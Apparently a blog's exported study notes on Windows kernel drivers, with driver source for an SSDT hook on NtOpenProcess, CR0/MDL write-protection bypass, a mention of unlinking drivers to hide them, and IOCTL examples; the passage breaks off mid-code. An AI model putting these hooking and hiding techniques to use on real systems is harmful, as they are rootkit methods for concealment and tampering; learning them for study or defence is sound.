CR0的第16位是写保护未即WP位(486系列之后)，只要将这一位置0就可以禁用写保护，置1则可将其恢复。 在网上找了一个文章补了一下 简单来讲就是决定当前代码是否可写 但是在内核中没有Virtualprotect这样的函数，所以要用MDL，也是用来改保护的 源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107#include&lt;ntifs.h&gt;#include&lt;ntimage.h&gt;#include &lt;ntddk.h&gt;typedef struct __SSDTItem&#123; PULONG funcTable; ULONG count; ULONG funcMax; PUCHAR paremTable;&#125;SSDTItem, * PSSDTItem;typedef struct __SSDTservice &#123; SSDTItem ssdt; SSDTItem sssdt;&#125;SSDTservice,* PSSDTservice;NTSTATUS NTAPI MyOpenProcess( _Out_ PHANDLE ProcessHandle, _In_ ACCESS_MASK DesiredAccess, _In_ POBJECT_ATTRIBUTES ObjectAttributes, _In_opt_ PCLIENT_ID ClientId) &#123; DbgPrintEx(77, 0, &quot;helloworld\\t\\n&quot;); return NtOpenProcess(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);&#125;EXTERN_C PSSDTservice KeServiceDescriptorTable;PVOID MDLmAPvIRTUAL(PVOID VirtualAddress, ULONG_PTR len, MODE mode, PMDL *Retpmdl) &#123; PMDL pmdl = IoAllocateMdl(VirtualAddress, len, NULL, NULL, NULL); BOOLEAN isLock = FALSE; PULONG map = NULL; __try &#123; MmProbeAndLockPages(pmdl, mode, IoReadAccess); //锁页 isLock = TRUE; map = MmMapLockedPagesSpecifyCache(pmdl, mode, MmNonCached, NULL, FALSE, NormalPagePriority); &#125; __except (1) &#123; map = NULL; if (isLock) &#123; MmUnlockPages(pmdl); &#125; if (pmdl) &#123; IoFreeMdl(pmdl); &#125; return NULL; &#125; if (!map) &#123; return NULL; &#125; *Retpmdl = pmdl; return map;&#125;PVOID MDUnLmAPvIRTUAL(PVOID mapAddress, PMDL pmdl)&#123; MmUnmapLockedPages(mapAddress, pmdl); MmUnlockPages(pmdl); IoFreeMdl(pmdl);&#125;VOID KernelSleep(ULONG ms, BOOLEAN isAlert)&#123; LARGE_INTEGER inTime = &#123; 0 &#125;; inTime.QuadPart = -10000; inTime.QuadPart *= ms; KeDelayExecutionThread(KernelMode, isAlert, &amp;inTime);&#125;VOID DriverUnload(PDRIVER_OBJECT pDriver) &#123; PUCHAR tempFuncTable = KeServiceDescriptorTable-&gt;ssdt.funcTable; PMDL pmdl; PULONG map = MDLmAPvIRTUAL(tempFuncTable, PAGE_SIZE, KernelMode, &amp;pmdl); if (map) &#123; map[0xBE] = (ULONG)NtOpenProcess; &#125; MDUnLmAPvIRTUAL(map, pmdl); KernelSleep(300, FALSE);&#125;NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pPeg) &#123; PUCHAR tempFuncTable = KeServiceDescriptorTable-&gt;ssdt.funcTable; PMDL pmdl; PULONG map = MDLmAPvIRTUAL(tempFuncTable, PAGE_SIZE, KernelMode, &amp;pmdl); if (map) &#123; map[0xBE] = (ULONG)MyOpenProcess; &#125; MDUnLmAPvIRTUAL(map, pmdl); pDriver-&gt;DriverUnload = DriverUnload; return STATUS_SUCCESS;&#125; 改进 `MmProbeAndLockPages`这个创建页的函数效率很低，可以用其他API代替如: `MmBuildForNonPagePool` 区别在于锁页 API `IoAllocateMdl` 创建一个页描述符 MmProbeAndLockPages 锁页(挂页并且上梭) MmMapLockedPagesSpecifyCache 访问页(解锁访问) 进程 结构 进程刚开始创建仅仅是有一个空间，和对进程的描述结构，实际上就是申请了一片地用于进程 相关windbg `EPROCESS` 进程结构体(PEB?) 指令 `dt _EPROCESS Addrxxx` KPROCESS EPROCESS的第一个成员 指令 dt _KPROCESS AAddrxxx 内核小知识 linux使用的是宏内核，线程调度，内存，进程管理，文件管理是一体的，紧密联系。模块无法抽出 win用的是微内核，线程调度，内存，进程管理，对象的管理，是可以抽出来的 K_系列封装 微内核层 E_封装 执行体层 样本分析 EPROCESS 123456789101112131415161718192021+0x000 Pcb : _KPROCESS KPROCESS +0x098 ProcessLock : _EX_PUSH_LOCK 锁-字段成员+0x0a0 CreateTime : _LARGE_INTEGER 0x01dbb81f`fc377b28 开始时间 +0x0a8 ExitTime : _LARGE_INTEGER 0x0 结束时间 +0x0b0 RundownProtect : _EX_RUNDOWN_REF 锁-标志位 +0x0b4 UniqueProcessId : 0x00000c68 Void+0x0b8 ActiveProcessLinks : _LIST_ENTRY [ 0x83f4dd70 - 0x87698bb0 ]+0x0c0 ProcessQuotaUsage : [2] 0xd5c+0x0c8 ProcessQuotaPeak : [2] 0xdd4+0x0d0 CommitCharge : 0x100+0x0d4 QuotaBlock : 0x8733e940 _EPROCESS_QUOTA_BLOCK+0x0d8 CpuQuotaBlock : (null) +0x0dc PeakVirtualSize : 0x4480000+0x0e0 VirtualSize : 0x447e000+0x0e4 SessionProcessLinks : _LIST_ENTRY [ 0x8d44e010 - 0x87698bdc ]+0x0ec DebugPort : (null) +0x0f0 ExceptionPortData : 0x8719df00 Void+0x0f0 ExceptionPortValue : 0x8719df00+0x0f0 ExceptionPortState : 0y000+0x0f4 ObjectTable : 0xb02d9828 _HANDLE_TABLE KRPOCESS 12345678910111213141516171819202122232425262728293031323334+0x000 Header : _DISPATCHER_HEADER +0x010 ProfileListHead : _LIST_ENTRY [ 0x85770580 - 0x85770580 ] +0x018 DirectoryTableBase : 0x3ea6f680 //cr3+0x01c LdtDescriptor : _KGDTENTRY +0x024 Int21Descriptor : _KIDTENTRY +0x02c ThreadListHead : _LIST_ENTRY [ 0x85720b10 - 0x85720b10 ] //线程链表+0x034 ProcessLock : 0 //修改成员同步锁+0x038 Affinity : _KAFFINITY_EX //亲核性 在哪个CPU核跑+0x044 ReadyListHead : _LIST_ENTRY [ 0x857705b4 - 0x857705b4 ] //进程下的就绪线程链表+0x04c SwapListEntry : _SINGLE_LIST_ENTRY //磁盘交换链表+0x050 ActiveProcessors : _KAFFINITY_EX //当前进程下活动的核+0x05c AutoAlignment : 0y0 //自动对齐+0x05c DisableBoost : 0y0 //和线程优先级有关+0x05c DisableQuantum : 0y0 //是否关闭进程下线程时间碎片机制+0x05c ActiveGroupsMask : 0y1 +0x05c ReservedFlags : 0y0000000000000000000000000000 (0) +0x05c ProcessFlags : 0n8+0x060 BasePriority : 8 &#x27;&#x27; //线程继承进程的基本优先级+0x061 QuantumReset : 18 &#x27;&#x27; //线程的时间碎片基础值+0x062 Visited : 0 &#x27;&#x27; +0x063 Unused3 : 0 &#x27;&#x27;+0x064 ThreadSeed : [1] 0+0x068 IdealNode : [1] 0+0x06a IdealGlobalNode : 0+0x06c Flags : _KEXECUTE_OPTIONS //关闭SEH机制+0x06d AddressPolicy : 0 &#x27;&#x27;+0x06e IopmOffset : 0x20ac+0x070 Unused4 : 0+0x074 StackCount : _KSTACK_COUNT+0x078 ProcessListEntry : _LIST_ENTRY [ 0x0 - 0x0 ]+0x080 CycleTime : 0+0x088 KernelTime : 0+0x08c UserTime : 0+0x090 VdmTrapcHandler : (null)","updated":"2025-10-08T09:42:42.822Z","categories":[{"name":"逆向行驶","slug":"逆向行驶","permalink":"https://l1pmoluy.github.io/categories/%E9%80%86%E5%90%91%E8%A1%8C%E9%A9%B6/"}],"tags":[{"name":"windows深度学习","slug":"windows深度学习","permalink":"https://l1pmoluy.github.io/tags/windows%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"}]},{"title":"WindowsStudy02-初窥驱动","date":"2025-04-17T12:05:38.000Z","path":"2025/04/17/WindowsStudy02-初窥驱动/","text":"简单的学习并编写驱动程序 首先要改属性 注意：配置是所有配置，平台不知道为什么我这里只能x86 C&#x2F;C++-&gt;常规-&gt;将警告视为错误-&gt;否 Driver Settings-&gt;Target OS Version-&gt;win7 SDL检查也关了 模板 123456789#include&lt;ntifs.h&gt;VOID DriverUnload(PDRIVER_OBJECT pDriver) &#123;&#125;NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pPeg) &#123; pDriver-&gt;DriverUnload = DriverUnload; return STATUS_SUCCESS;&#125; helloworld 基本框架其实最开始就遇到了，在配置环境的时候 简单解释，DriverUnload是自己完善的卸载函数，DiverEntry是驱动的主函数，也就是加载的时候就会被引用 参数一-pDiver是该驱动的”对象”，其实这个也好理解，pDriver-&gt;DriverUnload是给驱动挂载卸载函数，最终返回正确，第二个参数是安装路径，驱动安装的路径 printf平替是DbgPrintEx，前两个参数别管，后面跟着就好 12345678910#include&lt;ntifs.h&gt;VOID DriverUnload(PDRIVER_OBJECT pDriver) &#123;&#125;NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pPeg) &#123; DbgBreakPoint(); DbgPrintEx(77,0,&quot;---------hello world------------------\\r\\n&quot;); pDriver-&gt;DriverUnload = DriverUnload; return STATUS_SUCCESS;&#125; 链表 练习 12345678910111213141516171819202122232425262728293031323334353637383940#include&lt;ntifs.h&gt;VOID DriverUnload(PDRIVER_OBJECT pDriver) &#123;&#125;typedef struct xxx &#123; struct xxx* next; struct xxx* last; INT x;&#125;XXX, * PXXX;NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pPeg) &#123; DbgBreakPoint(); XXX head; XXX x1; XXX x2; x1.x = 0x10; x2.x = 0x20; InitializeListHead(&amp;head); InitializeListHead(&amp;x1); InitializeListHead(&amp;x2); InsertTailList(&amp;head, &amp;x1); InsertTailList(&amp;head, &amp;x2); PLIST_ENTRY Tmp = &amp;head; do &#123; Tmp = Tmp-&gt;Blink; XXX temp = *(PXXX)Tmp; if (temp.x == 0x20) &#123; DbgPrintEx(77, 0, &quot;find 0x20&quot;); &#125; &#125; while (Tmp != &amp;head); pDriver-&gt;DriverUnload = DriverUnload; return STATUS_SUCCESS;&#125; 断链 看懂了，但是感觉写起来很复杂，就是模拟了驱动所在的链表，可以通过链表找到想要断链隐藏的驱动（如果是自身的话要等后续内核对自己的调用结束之后，再断链，可以用休眠的api） 蓝屏分析 练习 首先windbg支持tab自动补全，当蓝屏触发时，可以用!analyze -v指令来查看蓝屏信息，那么我们以该程序测试，这个给0地址赋值包崩溃的 1234567891011#include&lt;ntifs.h&gt;VOID DriverUnload(PDRIVER_OBJECT pDriver) &#123;&#125;NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pPeg) &#123; INT* a = 0; *a = 100; pDriver-&gt;DriverUnload = DriverUnload; return STATUS_SUCCESS;&#125; 蓝屏通知： 123456789101112131415Fail to read system\\currentcontrolset\\services\\Lmhosts\\Parameters\\EnableUserMode, error=2*** Fatal System Error: 0x0000007e (0xC0000005,0xA4B9D00E,0x807F98FC,0x807F9360)Break instruction exception - code 80000003 (first chance)A fatal system error has occurred.Debugger entered on first try; Bugcheck callbacks have not been invoked.A fatal system error has occurred.For analysis of this file, run !analyze -vnt!RtlpBreakWithStatusInstruction:83eb61bc cc int 3 可以看到这里他提示我!analyze了， 那我们输入进入 …跳转io通信里的蓝屏 存放地址 默认蓝屏信息存放地址：`C:\\Windows\\Minidump` IO通信 驱动对象->设备对象Tail.Overlay.CurrentStackLocation->`基础是这样很冗杂 可以用函数 dt 0x876a8c40 _IO_STACK_LOCATION查看相关参数，MajorFunction是回调函数序号 pIrp-&gt;Tail.Overlay.CurrentStackLocation-&gt;MajorFunction -r1展开Parameters找到DeviceIoControl-r2展开 12345+0x000 DeviceIoControl : &lt;unnamed-tag&gt;+0x000 OutputBufferLength : 4+0x004 InputBufferLength : 4+0x008 IoControlCode : 0+0x00c Type3InputBuffer : (null) 获得相关参数，改变通信代码来查看对应参数 1234567ULONG x1 = 10;ULONG64 x2 = 20;ULONG retlen = 0;BOOL isS = DeviceIoControl(hDevice, 1, &amp;x1, sizeof(x1), &amp;x2, sizeof(x2), &amp;retlen, NULL); 改变传参再次查看 12345[db]: MajorFumction:14[db]: InputBufferLength:4[db]: OutputBufferLength:8[db]: IoControlCode:1[db]: SystemBuffer: 87514ec0 10 如此遍明了DeviceIoControl传参如下 1. 设备句柄 2. IoControlCode 3. 传入参数 SystemBuffer 4. InputBufferLength 5. 返回参数 6. OutputBufferLength 改变返回参数 我的大致感觉就是，传入参数就像const，是不会改变了并且复制了一份在SystemBuffer中，后续如果对SystemBuffer操作，再回调函数结束后SystemBuffer的值会再次赋值给返回参数，从而做到返回 注意点: 直接更改SystemBuffer是不会改变的需要有以下操作 12pIrp-&gt;IoStatus.Status = STATUS_SUCCESS; //成功pIrp-&gt;IoStatus.Information = io-&gt;Parameters.DeviceIoControl.OutputBufferLength; //规定大小 所以将回调函数改成如下样式 1234567891011121314151617181920212223242526#define IOCTL_MYDEVICE_OPERATION CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)NTSTATUS myDispatch(PDEVICE_OBJECT pDevObj, PIRP pIrp)&#123; PIO_STACK_LOCATION io = IoGetCurrentIrpStackLocation(pIrp); ULONG ICC = io-&gt;Parameters.DeviceIoControl.IoControlCode; DbgPrintEx(77, 0, &quot;[db]: In %s\\r\\n&quot;, __FUNCTION__); //DbgBreakPoint(); DbgPrintEx(77, 0, &quot;[db]: MajorFunction: %x\\r\\n&quot;, io-&gt;MajorFunction); DbgPrintEx(77, 0, &quot;[db]: InputBufferLength: %d\\r\\n&quot;, io-&gt;Parameters.DeviceIoControl.InputBufferLength); DbgPrintEx(77, 0, &quot;[db]: OutputBufferLength: %d\\r\\n&quot;, io-&gt;Parameters.DeviceIoControl.OutputBufferLength); DbgPrintEx(77, 0, &quot;[db]: IoControlCode: %d\\r\\n&quot;, io-&gt;Parameters.DeviceIoControl.IoControlCode); DbgPrintEx(77, 0, &quot;[db]: SystemBuffer: %p %x \\r\\n&quot;, pIrp-&gt;AssociatedIrp.SystemBuffer,*((ULONG*)pIrp-&gt;AssociatedIrp.SystemBuffer)); switch (ICC) &#123; case IOCTL_MYDEVICE_OPERATION: *(ULONG*)pIrp-&gt;AssociatedIrp.SystemBuffer = 0x520; DbgPrintEx(77, 0, &quot;[db]: SystemBuffer: %p %x \\r\\n&quot;, pIrp-&gt;AssociatedIrp.SystemBuffer, *((ULONG*)pIrp-&gt;AssociatedIrp.SystemBuffer)); &#125; //正确返回 pIrp-&gt;IoStatus.Status = STATUS_SUCCESS; pIrp-&gt;IoStatus.Information = io-&gt;Parameters.DeviceIoControl.OutputBufferLength; IoCompleteRequest(pIrp, IO_NO_INCREMENT); return STATUS_SUCCESS;&#125; 这里的IOCTL_MYDEVICE_OPERATION作用其实就是出了创建和销毁，剩下的回调函数基本都是这个，那么区分回调函数代码作用的自然就是传入的IoControlCode，控制码，这里和传入控制码进行switch筛选 通信代码 123456789101112131415161718192021222324252627#include &lt;iostream&gt;#include&lt;Windows.h&gt;#define _DRIVER_SYM L&quot;\\\\??\\\\myiotest&quot;#define IOCTL_MYDEVICE_OPERATION CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)int main()&#123; HANDLE hDevice = CreateFile(_DRIVER_SYM, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hDevice == INVALID_HANDLE_VALUE) &#123; printf(&quot;打开设备失败 error:%d \\r\\n&quot;, GetLastError()); &#125; else &#123; system(&quot;pause&quot;); ULONG xin = 10; ULONG64 xout = 0; ULONG retlen = 0; BOOL isS = DeviceIoControl(hDevice, IOCTL_MYDEVICE_OPERATION, &amp;xin, sizeof(xin), &amp;xout, sizeof(xout), &amp;retlen, NULL); printf(&quot;result %d ,%d, %x\\r\\n&quot;, isS, GetLastError(), xout); &#125; system(&quot;pause&quot;); return 0;&#125; 好的我们再捋一遍思路: xin-&gt;SystemBuffer-&gt;SystemBuffer&#x3D;0x520-&gt;xout&#x3D;SystemBuffer-&gt;xout&#x3D;0x520 运行一下试试 最终获取正确结果 ps：retLen的存放的是实际返回参数的大小，可以验证一下 Io通信小记 设备对象下的Flag标志位对应的参数与DeviceIoControl的第二个参数中METHOD_BUFFERED这类的标志是相似的，其规定再传参时，标志采用复制，映射还是直接索引实际地址 所以在实践时会十分冗杂麻烦，火哥建议，先用一层结构体做建议Irp，类似通信传参的封装，在这个中引用真正参数的结构体，后续实践来更好理解（确实会如此，在我自己写计算器的时候，num参数因为sizeof的问题只传了一个参数，但是需要很繁杂的去dt dd来检索问题） 还有就是这样操作会减少蓝屏，毕竟你再怎么操作，都是对R0层结构体中指向的部分，操作。 有世外桃源的感觉了 最终练习代码 计算器 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include &lt;iostream&gt;#include&lt;Windows.h&gt;#define _DRIVER_SYM L&quot;\\\\??\\\\myiotest&quot;#define CASE0 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)#define CASE1 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)#define CASE2 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)#define CASE3 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)#define CASE4 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)HANDLE hDevice;void init(PULONG num,PUCHAR cc) &#123; ULONG i = 0; CHAR c[100] = &#123; 0 &#125;; printf(&quot;[计算器]: &quot;); scanf(&quot;%s&quot;, c); while (c[i] &gt;= &#x27;0&#x27; &amp;&amp; c[i] &lt;= &#x27;9&#x27;) num[0] = num[0] * 10 + (c[i++] - &#x27;0&#x27;); *cc = c[i++]; while (c[i] &gt;= &#x27;0&#x27; &amp;&amp; c[i] &lt;= &#x27;9&#x27;) num[1] = num[1] * 10 + (c[i++] - &#x27;0&#x27;); printf(&quot;%d %c %d&quot;, num[0], *cc, num[1]);&#125;ULONG IoC(PULONG num, PUCHAR cc) &#123; ULONG result = 0; ULONG retlen = 0; switch (*cc) &#123; case &#x27;+&#x27;: DeviceIoControl(hDevice, CASE1, num, sizeof(num) * 2, &amp;result, sizeof(result), &amp;retlen, NULL); break; case &#x27;-&#x27;: DeviceIoControl(hDevice, CASE2, num, sizeof(num) * 2, &amp;result, sizeof(result), &amp;retlen, NULL); break; case &#x27;*&#x27;: DeviceIoControl(hDevice, CASE3, num, sizeof(num) * 2, &amp;result, sizeof(result), &amp;retlen, NULL); break; case &#x27;/&#x27;: DeviceIoControl(hDevice, CASE4, num, sizeof(num) * 2, &amp;result, sizeof(result), &amp;retlen, NULL); break; default: break; &#125; return result;&#125;int main()&#123; hDevice = CreateFile(_DRIVER_SYM, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hDevice == INVALID_HANDLE_VALUE) &#123; printf(&quot;打开设备失败 error:%d \\r\\n&quot;, GetLastError()); &#125; else &#123; ULONG is = 1; while (is) &#123; UCHAR cc; ULONG num[2] = &#123; 0 &#125;; init(num, &amp;cc); printf(&quot; = %d\\r\\n是否继续，继续请按1，反之按0\\r\\n&quot;, IoC(num, &amp;cc)); scanf(&quot;%d&quot;, &amp;is); &#125; &#125; system(&quot;pause&quot;); return 0;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121#include &lt;ntddk.h&gt;#include &lt;ntstatus.h&gt;#define DEVICE_NAME L&quot;\\\\device\\\\myiotest&quot;#define SYMBOLICLINK_NAME L&quot;\\\\??\\\\myiotest&quot;#define OPER1 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)#define OPER2 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)VOID DriverUnload(PDRIVER_OBJECT pDriver)&#123; UNICODE_STRING SymbolicLinkName = &#123; 0 &#125;; DbgPrint(&quot;[db]: Close...\\r\\n&quot;); RtlInitUnicodeString(&amp;SymbolicLinkName, SYMBOLICLINK_NAME); IoDeleteSymbolicLink(&amp;SymbolicLinkName); IoDeleteDevice(pDriver-&gt;DeviceObject);&#125;NTSTATUS Dispatch(PDEVICE_OBJECT pDevObj, PIRP pIrp)&#123; DbgPrintEx(77, 0, &quot;[db]: Being work...\\r\\n&quot;); pIrp-&gt;IoStatus.Status = STATUS_SUCCESS; pIrp-&gt;IoStatus.Information = 0; IoCompleteRequest(pIrp, IO_NO_INCREMENT); return STATUS_SUCCESS;&#125;#define CASE0 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)#define CASE1 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)#define CASE2 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)#define CASE3 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)#define CASE4 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)NTSTATUS myDispatch(PDEVICE_OBJECT pDevObj, PIRP pIrp)&#123; PIO_STACK_LOCATION io = IoGetCurrentIrpStackLocation(pIrp); ULONG ICC = io-&gt;Parameters.DeviceIoControl.IoControlCode; DbgPrintEx(77, 0, &quot;[db]: In %s\\r\\n&quot;, __FUNCTION__); //DbgBreakPoint(); DbgPrintEx(77, 0, &quot;[db]: MajorFunction: %x\\r\\n&quot;, io-&gt;MajorFunction); DbgPrintEx(77, 0, &quot;[db]: InputBufferLength: %d\\r\\n&quot;, io-&gt;Parameters.DeviceIoControl.InputBufferLength); DbgPrintEx(77, 0, &quot;[db]: OutputBufferLength: %d\\r\\n&quot;, io-&gt;Parameters.DeviceIoControl.OutputBufferLength); DbgPrintEx(77, 0, &quot;[db]: IoControlCode: %d\\r\\n&quot;, io-&gt;Parameters.DeviceIoControl.IoControlCode); DbgPrintEx(77, 0, &quot;[db]: SystemBuffer: %p %x \\r\\n&quot;, pIrp-&gt;AssociatedIrp.SystemBuffer,*((ULONG*)pIrp-&gt;AssociatedIrp.SystemBuffer)); ULONG* num; ULONG result; DbgPrintEx(77, 0, &quot;[db]: SystemBuffer: %p %x %x\\r\\n&quot;, pIrp-&gt;AssociatedIrp.SystemBuffer, *(ULONG*)pIrp-&gt;AssociatedIrp.SystemBuffer, *((ULONG*)pIrp-&gt;AssociatedIrp.SystemBuffer + 1)); //DbgBreakPoint(); switch (ICC) &#123; case CASE0: *(ULONG*)pIrp-&gt;AssociatedIrp.SystemBuffer = 0x520; break; case CASE1: num = (ULONG*)pIrp-&gt;AssociatedIrp.SystemBuffer; result = num[0] + num[1]; *(ULONG*)pIrp-&gt;AssociatedIrp.SystemBuffer = result; break; case CASE2: num = (ULONG*)pIrp-&gt;AssociatedIrp.SystemBuffer; result = num[0] - num[1]; *(ULONG*)pIrp-&gt;AssociatedIrp.SystemBuffer = result; break; case CASE3: num = (ULONG*)pIrp-&gt;AssociatedIrp.SystemBuffer; result = num[0] * num[1]; *(ULONG*)pIrp-&gt;AssociatedIrp.SystemBuffer = result; break; case CASE4: num = (ULONG*)pIrp-&gt;AssociatedIrp.SystemBuffer; result = num[0] / num[1]; *(ULONG*)pIrp-&gt;AssociatedIrp.SystemBuffer = result; break; &#125; //正确返回 pIrp-&gt;IoStatus.Status = STATUS_SUCCESS; pIrp-&gt;IoStatus.Information = io-&gt;Parameters.DeviceIoControl.OutputBufferLength; IoCompleteRequest(pIrp, IO_NO_INCREMENT); return STATUS_SUCCESS;&#125;NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING reg_path)&#123; NTSTATUS status = 0; ULONG uIndex = 0; PDEVICE_OBJECT pDeviceObj = NULL; UNICODE_STRING Devicename; UNICODE_STRING SymbolicLinkName; RtlInitUnicodeString(&amp;Devicename, DEVICE_NAME); status = IoCreateDevice(pDriver, 0, &amp;Devicename, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &amp;pDeviceObj); if (status != STATUS_SUCCESS) &#123; DbgPrint(&quot;创建设备失败! \\r\\n&quot;); return status; &#125; pDeviceObj-&gt;Flags |= DO_BUFFERED_IO; RtlInitUnicodeString(&amp;SymbolicLinkName, SYMBOLICLINK_NAME); status = IoCreateSymbolicLink(&amp;SymbolicLinkName, &amp;Devicename); if (status != STATUS_SUCCESS) &#123; DbgPrint(&quot;创建符号链接失败! \\r\\n&quot;); IoDeleteDevice(pDeviceObj); return status; &#125; pDriver-&gt;MajorFunction[IRP_MJ_CREATE] = Dispatch; pDriver-&gt;MajorFunction[IRP_MJ_CLOSE] = Dispatch; pDriver-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = myDispatch; pDriver-&gt;DriverUnload = DriverUnload; DbgPrint(&quot;[db]: Finish...\\r\\n&quot;); return STATUS_SUCCESS;&#125; 结构体传参练习 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;iostream&gt;#include&lt;Windows.h&gt;#define _DRIVER_SYM L&quot;\\\\??\\\\myiotest&quot;#define CASE0 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)HANDLE hDevice;typedef struct __MyInputBuffer &#123; CHAR initstring[100]; //输入 CHAR outstring[100]; //输出 ULONG len; //长度&#125;MIB, * PMIB;typedef struct __MyEasyIo &#123; ULONG type; //处理类型 ULONG64 in; //处理参数 ULONG64 is; //是否继续&#125;MEI, * PMEI;void init(PMEI m, PMIB in) &#123; ULONG len = 0; printf(&quot;请选择您的功能(倒置 1，单双 2): &quot;); scanf(&quot;%d&quot;, &amp;m-&gt;type); getchar(); fgets(in-&gt;initstring, 100, stdin); while (in-&gt;initstring[len] != &#x27;\\n&#x27;) len++; in-&gt;initstring[len] = 0; in-&gt;len = len; m-&gt;in = (ULONG64)in;&#125;void IoC(PMEI m) &#123; ULONG retlen = 0; DeviceIoControl(hDevice, CASE0, m, sizeof(MEI), m, sizeof(MEI), &amp;retlen, NULL);&#125;int main()&#123; hDevice = CreateFile(_DRIVER_SYM, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hDevice == INVALID_HANDLE_VALUE) &#123; printf(&quot;打开设备失败 error:%d \\r\\n&quot;, GetLastError()); &#125; else &#123; MEI m; MIB in; m.is = 1; while (m.is) &#123; init(&amp;m, &amp;in); IoC(&amp;m); printf(&quot;result=%s\\r\\n是否继续?\\r\\n&quot;, in.outstring); scanf(&quot;%d&quot;, &amp;m.is); &#125; &#125; system(&quot;pause&quot;); return 0;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131#include &lt;ntddk.h&gt;#include &lt;ntstatus.h&gt;#define DEVICE_NAME L&quot;\\\\device\\\\myiotest&quot;#define SYMBOLICLINK_NAME L&quot;\\\\??\\\\myiotest&quot;#define CASE0 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)typedef struct __MyInputBuffer &#123; CHAR initstring[100]; //输入 CHAR outstring[100]; //输出 ULONG len; //长度&#125;MIB, * PMIB;typedef struct __MyEasyIo &#123; ULONG type; //处理类型 ULONG64 in; //处理参数 ULONG64 is; //是否继续&#125;MEI, * PMEI;VOID DriverUnload(PDRIVER_OBJECT pDriver)&#123; UNICODE_STRING SymbolicLinkName = &#123; 0 &#125;; DbgPrint(&quot;[db]: Close...\\r\\n&quot;); RtlInitUnicodeString(&amp;SymbolicLinkName, SYMBOLICLINK_NAME); IoDeleteSymbolicLink(&amp;SymbolicLinkName); IoDeleteDevice(pDriver-&gt;DeviceObject);&#125;NTSTATUS Dispatch(PDEVICE_OBJECT pDevObj, PIRP pIrp)&#123; DbgPrintEx(77, 0, &quot;[db]: Being work...\\r\\n&quot;); pIrp-&gt;IoStatus.Status = STATUS_SUCCESS; pIrp-&gt;IoStatus.Information = 0; IoCompleteRequest(pIrp, IO_NO_INCREMENT); return STATUS_SUCCESS;&#125;NTSTATUS myDispatch(PDEVICE_OBJECT pDevObj, PIRP pIrp)&#123; PIO_STACK_LOCATION io = IoGetCurrentIrpStackLocation(pIrp); ULONG ICC = io-&gt;Parameters.DeviceIoControl.IoControlCode; DbgPrintEx(77, 0, &quot;[db]: In %s\\r\\n&quot;, __FUNCTION__); //DbgBreakPoint(); DbgPrintEx(77, 0, &quot;[db]: MajorFunction: %x\\r\\n&quot;, io-&gt;MajorFunction); DbgPrintEx(77, 0, &quot;[db]: InputBufferLength: %d\\r\\n&quot;, io-&gt;Parameters.DeviceIoControl.InputBufferLength); DbgPrintEx(77, 0, &quot;[db]: OutputBufferLength: %d\\r\\n&quot;, io-&gt;Parameters.DeviceIoControl.OutputBufferLength); DbgPrintEx(77, 0, &quot;[db]: IoControlCode: %d\\r\\n&quot;, io-&gt;Parameters.DeviceIoControl.IoControlCode); ULONG* num; ULONG result; DbgPrintEx(77, 0, &quot;[db]: SystemBuffer: %p\\r\\n&quot;, 